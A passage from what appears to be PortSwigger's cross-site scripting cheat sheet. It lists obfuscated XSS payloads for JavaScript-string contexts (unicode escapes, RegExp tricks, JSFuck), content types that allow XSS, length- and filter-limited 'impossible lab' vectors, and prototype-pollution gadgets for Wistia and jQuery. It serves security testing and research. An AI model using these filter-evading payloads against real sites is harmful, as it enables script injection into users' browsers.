(globalThis)\n\n[`';globalThis['\\u{0061}\\u{006c}\\u{0065}\\u{0072}\\u{0074}']('\\u{0058}\\u{0053}\\u{0053}');//`](https://portswigger-labs.net/xss/xss.php?x=%27%3BglobalThis%5B%27%5Cu%7B0061%7D%5Cu%7B006c%7D%5Cu%7B0065%7D%5Cu%7B0072%7D%5Cu%7B0074%7D%27%5D%28%27%5Cu%7B0058%7D%5Cu%7B0053%7D%5Cu%7B0053%7D%27%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-unicode-escape-globalthis)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: RegExp source property (window)\n\n[`';window[/al/.source+/ert/.source](/XSS/.source);//`](https://portswigger-labs.net/xss/xss.php?x=%27%3Bwindow%5B%2Fal%2F.source%2B%2Fert%2F.source%5D%28%2FXSS%2F.source%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-regexp-source-property-window)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: RegExp source property (self)\n\n[`';self[/al/.source+/ert/.source](/XSS/.source);//`](https://portswigger-labs.net/xss/xss.php?x=%27%3Bself%5B%2Fal%2F.source%2B%2Fert%2F.source%5D%28%2FXSS%2F.source%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-regexp-source-property-self)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: RegExp source property (this)\n\n[`';this[/al/.source+/ert/.source](/XSS/.source);//`](https://portswigger-labs.net/xss/xss.php?x=%27%3Bthis%5B%2Fal%2F.source%2B%2Fert%2F.source%5D%28%2FXSS%2F.source%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-regexp-source-property-this)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: RegExp source property (top)\n\n[`';top[/al/.source+/ert/.source](/XSS/.source);//`](https://portswigger-labs.net/xss/xss.php?x=%27%3Btop%5B%2Fal%2F.source%2B%2Fert%2F.source%5D%28%2FXSS%2F.source%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-regexp-source-property-top)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: RegExp source property (parent)\n\n[`';parent[/al/.source+/ert/.source](/XSS/.source);//`](https://portswigger-labs.net/xss/xss.php?x=%27%3Bparent%5B%2Fal%2F.source%2B%2Fert%2F.source%5D%28%2FXSS%2F.source%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-regexp-source-property-parent)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: RegExp source property (frames)\n\n[`';frames[/al/.source+/ert/.source](/XSS/.source);//`](https://portswigger-labs.net/xss/xss.php?x=%27%3Bframes%5B%2Fal%2F.source%2B%2Fert%2F.source%5D%28%2FXSS%2F.source%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-regexp-source-property-frames)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: RegExp source property (globalThis)\n\n[`';globalThis[/al/.source+/ert/.source](/XSS/.source);//`](https://portswigger-labs.net/xss/xss.php?x=%27%3BglobalThis%5B%2Fal%2F.source%2B%2Fert%2F.source%5D%28%2FXSS%2F.source%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-regexp-source-property-globalthis)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: Hieroglyphy/JSFuck (window)\n\n[`';window[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//`](https://portswigger-labs.net/xss/xss.php?x=%27%3Bwindow%5B%28%2B%7B%7D%2B%5B%5D%29%5B%2B%21%21%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%21%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%21%5B%5D%2B%21%21%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%21%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%28%28%2B%7B%7D%2B%5B%5D%29%5B%2B%21%21%5B%5D%5D%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-hieroglyphyjsfuck-window)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: Hieroglyphy/JSFuck (self)\n\n[`';self[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//`](https://portswigger-labs.net/xss/xss.php?x=%27%3Bself%5B%28%2B%7B%7D%2B%5B%5D%29%5B%2B%21%21%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%21%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%21%5B%5D%2B%21%21%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%21%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%28%28%2B%7B%7D%2B%5B%5D%29%5B%2B%21%21%5B%5D%5D%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-hieroglyphyjsfuck-self)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: Hieroglyphy/JSFuck (this)\n\n[`';this[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//`](https://portswigger-labs.net/xss/xss.php?x=%27%3Bthis%5B%28%2B%7B%7D%2B%5B%5D%29%5B%2B%21%21%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%21%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%21%5B%5D%2B%21%21%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%21%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%28%28%2B%7B%7D%2B%5B%5D%29%5B%2B%21%21%5B%5D%5D%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-hieroglyphyjsfuck-this)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: Hieroglyphy/JSFuck (top)\n\n[`';top[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//`](https://portswigger-labs.net/xss/xss.php?x=%27%3Btop%5B%28%2B%7B%7D%2B%5B%5D%29%5B%2B%21%21%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%21%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%21%5B%5D%2B%21%21%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%21%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%28%28%2B%7B%7D%2B%5B%5D%29%5B%2B%21%21%5B%5D%5D%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-hieroglyphyjsfuck-top)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: Hieroglyphy/JSFuck (parent)\n\n[`';parent[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//`](https://portswigger-labs.net/xss/xss.php?x=%27%3Bparent%5B%28%2B%7B%7D%2B%5B%5D%29%5B%2B%21%21%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%21%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%21%5B%5D%2B%21%21%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%21%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%28%28%2B%7B%7D%2B%5B%5D%29%5B%2B%21%21%5B%5D%5D%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-hieroglyphyjsfuck-parent)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: Hieroglyphy/JSFuck (frames)\n\n[`';frames[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//`](https://portswigger-labs.net/xss/xss.php?x=%27%3Bframes%5B%28%2B%7B%7D%2B%5B%5D%29%5B%2B%21%21%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%21%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%21%5B%5D%2B%21%21%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%21%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%28%28%2B%7B%7D%2B%5B%5D%29%5B%2B%21%21%5B%5D%5D%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-hieroglyphyjsfuck-frames)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS into a JavaScript string: Hieroglyphy/JSFuck (globalThis)\n\n[`';globalThis[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//`](https://portswigger-labs.net/xss/xss.php?x=%27%3BglobalThis%5B%28%2B%7B%7D%2B%5B%5D%29%5B%2B%21%21%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%21%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%21%5B%5D%2B%21%21%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%21%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%28%28%2B%7B%7D%2B%5B%5D%29%5B%2B%21%21%5B%5D%5D%29%3B%2F%2F&context=js_string_single)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-into-a-javascript-string-hieroglyphyjsfuck-globalthis)\n\nContent types\n-------------\n\nThis section lists content-types that can be used for XSS with the X-Content-Type-Options: nosniff header active.\n\nContent-Type\n\ntext/html\n\napplication/xhtml+xml\n\napplication/xml\n\ntext/xml\n\nimage/svg+xml\n\ntext/xsl\n\napplication/vnd.wap.xhtml+xml\n\ntext/rdf\n\napplication/rdf+xml\n\napplication/mathml+xml\n\ntext/vtt\n\ntext/cache-manifest\n\nBrowsers\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\n![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\n![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)\n\n![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)\n\n![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)\n\nPoC\n\n[<script\\>alert(document.domain)</script\\>](https://portswigger-labs.net/xss/content-types.php?x=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&mime=text%2Fhtml)\n\n[<x:script xmlns:x=\"http://www.w3.org/1999/xhtml\"\\>alert(document.domain)</x:script\\>](https://portswigger-labs.net/xss/content-types.php?x=%3Cx%3Ascript%20xmlns%3Ax%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxhtml%22%3Ealert%28document.domain%29%3C%2Fx%3Ascript%3E&mime=application%2Fxhtml%2Bxml)\n\n[<x:script xmlns:x=\"http://www.w3.org/1999/xhtml\"\\>alert(document.domain)</x:script\\>](https://portswigger-labs.net/xss/content-types.php?x=%3Cx%3Ascript%20xmlns%3Ax%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxhtml%22%3Ealert%28document.domain%29%3C%2Fx%3Ascript%3E&mime=application%2Fxml)\n\n[<x:script xmlns:x=\"http://www.w3.org/1999/xhtml\"\\>alert(document.domain)</x:script\\>](https://portswigger-labs.net/xss/content-types.php?x=%3Cx%3Ascript%20xmlns%3Ax%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxhtml%22%3Ealert%28document.domain%29%3C%2Fx%3Ascript%3E&mime=text%2Fxml)\n\n[<x:script xmlns:x=\"http://www.w3.org/1999/xhtml\"\\>alert(document.domain)</x:script\\>](https://portswigger-labs.net/xss/content-types.php?x=%3Cx%3Ascript%20xmlns%3Ax%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxhtml%22%3Ealert%28document.domain%29%3C%2Fx%3Ascript%3E&mime=image%2Fsvg%2Bxml)\n\n[<x:script xmlns:x=\"http://www.w3.org/1999/xhtml\"\\>alert(document.domain)</x:script\\>](https://portswigger-labs.net/xss/content-types.php?x=%3Cx%3Ascript%20xmlns%3Ax%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxhtml%22%3Ealert%28document.domain%29%3C%2Fx%3Ascript%3E&mime=text%2Fxsl)\n\n[<x:script xmlns:x=\"http://www.w3.org/1999/xhtml\"\\>alert(document.domain)</x:script\\>](https://portswigger-labs.net/xss/content-types.php?x=%3Cx%3Ascript%20xmlns%3Ax%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxhtml%22%3Ealert%28document.domain%29%3C%2Fx%3Ascript%3E&mime=application%2Fvnd.wap.xhtml%2Bxml)\n\n[<x:script xmlns:x=\"http://www.w3.org/1999/xhtml\"\\>alert(document.domain)</x:script\\>](https://portswigger-labs.net/xss/content-types.php?x=%3Cx%3Ascript%20xmlns%3Ax%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxhtml%22%3Ealert%28document.domain%29%3C%2Fx%3Ascript%3E&mime=text%2Frdf)\n\n[<x:script xmlns:x=\"http://www.w3.org/1999/xhtml\"\\>alert(document.domain)</x:script\\>](https://portswigger-labs.net/xss/content-types.php?x=%3Cx%3Ascript%20xmlns%3Ax%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxhtml%22%3Ealert%28document.domain%29%3C%2Fx%3Ascript%3E&mime=application%2Frdf%2Bxml)\n\n[<x:script xmlns:x=\"http://www.w3.org/1999/xhtml\"\\>alert(document.domain)</x:script\\>](https://portswigger-labs.net/xss/content-types.php?x=%3Cx%3Ascript%20xmlns%3Ax%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxhtml%22%3Ealert%28document.domain%29%3C%2Fx%3Ascript%3E&mime=application%2Fmathml%2Bxml)\n\n[<script\\>alert(document.domain)</script\\>](https://portswigger-labs.net/xss/content-types.php?x=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&mime=text%2Fvtt)\n\n[<script\\>alert(document.domain)</script\\>](https://portswigger-labs.net/xss/content-types.php?x=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&mime=text%2Fcache-manifest)\n\nResponse content types\n----------------------\n\nThis section lists content-types that can be used for XSS when you can inject into the content-type header.\n\nContent-Type\n\ntext/plain; x=x, text/html, foobar\n\ntext/html(xxx\n\ntext/html xxx\n\ntext/html xxx\n\ntext/html, xxx\n\ntext/html; xxx\n\nBrowsers\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nPoC\n\n[<script\\>alert(document.domain)</script\\>](https://portswigger-labs.net/xss/content-types.php?x=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&mime=text%2Fplain%3B%20x%3Dx%2C%20text%2Fhtml%2C%20foobar)\n\n[<script\\>alert(document.domain)</script\\>](https://portswigger-labs.net/xss/content-types.php?x=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&mime=text%2Fhtml%28xxx)\n\n[<script\\>alert(document.domain)</script\\>](https://portswigger-labs.net/xss/content-types.php?x=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&mime=text%2Fhtml%09xxx)\n\n[<script\\>alert(document.domain)</script\\>](https://portswigger-labs.net/xss/content-types.php?x=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&mime=text%2Fhtml%20xxx)\n\n[<script\\>alert(document.domain)</script\\>](https://portswigger-labs.net/xss/content-types.php?x=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&mime=text%2Fhtml%2C%20xxx)\n\n[<script\\>alert(document.domain)</script\\>](https://portswigger-labs.net/xss/content-types.php?x=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&mime=text%2Fhtml%3B%20xxx)\n\nImpossible labs\n---------------\n\nTo find out what these are for, please refer to [Documenting the impossible: Unexploitable XSS labs](https://portswigger.net/research/documenting-the-impossible-unexploitable-xss-labs).\n\nTitle\n\nDescription\n\nLength limit\n\nClosest vector\n\nLink\n\nBasic context, WAF blocks <\\[a-zA-Z\\]\n\nThis lab captures the scenario when you can't use an open tag followed by an alphanumeric character. Sometimes you can solve this problem by bypassing the WAF entirely, but what about when that's not an option? Certain versions of .NET have this behaviour, and it's only known to be exploitable in old IE with <%tag.\n\nN/A\n\nN/A\n\n[\ud83d\udd17](https://portswigger-labs.net/impossible-labs/basic-context-waf-blocks-a-z.php?x=%3Cscript%3Ealert\\(1\\)%3C/script%3E)\n\nScript based injection but quotes, forward slash and backslash are escaped\n\nWe often encounter this situation in the wild: you have an injection inside a JavaScript variable and can inject angle brackets, but quotes and forward/backslashes are escaped so you can't simply close the script block.  \n  \nThe closest we've got to solving this is when you have multiple injection points. The first [within a script based context and the second in HTML](http://portswigger-labs.net/xss/script.php?x=%3C!--%3Cscript%3E&y=%3C/script%3E%3Cimg%20src=1%20onerror=alert\\(1\\)%3E).\n\nN/A\n\nN/A\n\n[\ud83d\udd17](http://portswigger-labs.net/impossible-labs/script-context-escaped-angle-brackets-allowed.php?x=%3C/script%3E%3Cimg%20src=1%20onerror=alert\\(1\\)%3E)\n\ninnerHTML context but no equals allowed\n\nYou have a site that processes the query string and URL decodes the parameters but splits on the equals then assigns to innerHTML. In this context <script\\> doesn't work and we can't use = to create an event.\n\nN/A\n\nN/A\n\n[\ud83d\udd17](https://portswigger-labs.net/impossible-labs/innerHTML-no-equals.php?x=%3Cimg%20src=1%20onerror=alert\\(1\\)%3E)\n\nBasic context length limit\n\nThis lab's injection occurs within the basic HTML context but has a length limitation of 15. Filedescriptor came up with a vector that could execute JavaScript in 16 characters: <q oncut=alert\\`\\` but can you beat it?\n\n15\n\n<q oncut=alert\\`\\`\n\n[\ud83d\udd17](https://portswigger-labs.net/impossible-labs/basic-context-length-limit.php?x=%3Csvg%20onload=alert``)\n\nAttribute context length limit\n\nThe context of this lab inside an attribute with a length limitation of 14 characters. We came up with a vector that executes JavaScript in 15 characters:\"oncut=alert\\`\\`+ the plus is a trailing space. Do you think you can beat it?\n\n14\n\n\"oncut=alert\\`\\`\n\n[\ud83d\udd17](https://portswigger-labs.net/impossible-labs/attribute-context-length-limit.php?x=%22oncut=alert``+)\n\nBasic context length limit, arbitrary code\n\nIt's all well and good executing JavaScript but if all you can do is call alert what use is that? In this lab we demonstrate the shortest possible way to execute arbitrary code.\n\n19\n\n<q oncut=eval(name)\n\n[\ud83d\udd17](https://portswigger-labs.net/impossible-labs/basic-context-length-limit-arbitrary.php?x=%3Cq%20oncut=eval\\(name\\))\n\nAttribute context length limit arbitrary code\n\nAgain calling alert proves you can call a function but we created another lab to find the shortest possible attribute based injection with arbitrary JavaScript.\n\n17\n\n[See link](https://lbherrera.github.io/lab/portswigger/18chars.html)\n\n[\ud83d\udd17](https://portswigger-labs.net/impossible-labs/attribute-context-length-limit-arbitrary.php?a=`+alert\\(document.domain\\);//&x=%22oncut=%22eval\\(%27`%27%2bURL\\))\n\nInjection occurs inside a frameset but before the body\n\nWe received a [request from twitter](https://twitter.com/roughwire/status/1250320540625014787?s=20) about this next lab. It occurs within a frameset but before a body tag with equals filtered. You would think you could inject a closing frameset followed by a script block but that would be too easy.\n\nN/A\n\nN/A\n\n[\ud83d\udd17](https://portswigger-labs.net/impossible-labs/after-frameset-before-body.php?x=%3C/frameset%3E%3Cscript%3Ealert\\(1\\)%3C/script%3E)\n\nInjection occurs inside single quoted string, only characters a-z0-9+'.\\` are allowed.\n\nThe injection occurs within a single quoted string and the challenge is to execute arbitrary code using the charset a-zA-Z0-9'+.\\`. [Luan Herrera](https://twitter.com/lbherrera_) solved this lab in an amazing way, you can view the solution in the following [post.](https://portswigger.net/research/redefining-impossible-xss-without-arbitrary-javascript)\n\nN/A\n\nN/A\n\n[\ud83d\udd17](https://portswigger-labs.net/impossible-labs/arbitrary-code-script-limited-charset.php?x=%27%2balert`1`%2b%27)\n\nInjection occurs inside double quoted src attribute of a image element\n\nThe double quote is encoded, the challenge is to find a way to execute XSS within a quoted src attribute.\n\nN/A\n\nN/A\n\n[\ud83d\udd17](https://portswigger-labs.net/impossible-labs/inside-image-src-encoded.php?x=1%22onerror=alert\\(1\\)+)\n\nPrototype pollution\n-------------------\n\nLibrary\n\nPayload\n\nAuthor\n\nVersion\n\nFingerprint\n\nWistia Embedded Video\n\n[``` <script> Object.prototype.innerHTML = '<img/src/onerror=alert(1)>'; </script> ```](https://portswigger-labs.net/xss/xss.php?x=%3C%21--%20Start%20Framework%20code--%3E%3Cscript%20src%3D%22https%3A%2F%2Ffast.wistia.com%2Fembed%2Fmedias%2Fj38ihh83m5.jsonp%22%20async%3E%3C%2Fscript%3E%3Cscript%20src%3D%22https%3A%2F%2Ffast.wistia.com%2Fassets%2Fexternal%2FE-v1.js%22%20async%3E%3C%2Fscript%3E%3Cdiv%20class%3D%22wistia_embed%20wistia_async_j38ihh83m5%22%3E%3C%2Fdiv%3E%0A%3C%21--End%20Framework%20code--%3E%0A%3Cscript%3E%0AObject.prototype.innerHTML%20%3D%20%27%3Cimg%2Fsrc%2Fonerror%3Dalert%281%29%3E%27%3B%0A%3C%2Fscript%3E)\n\n[William Bowling](https://twitter.com/wcbowling)\n\nAll versions\n\nreturn (typeof wistiaEmbeds !== 'undefined')\n\n$(x).off jQuery\n\n[``` <script> Object.prototype.preventDefault='x'; Object.prototype.handleObj='x'; Object.prototype.delegateTarget='<img/src/onerror=alert(1)>'; /* No extra code needed for jQuery 1 & 2 */$(document).off('foobar'); </script> 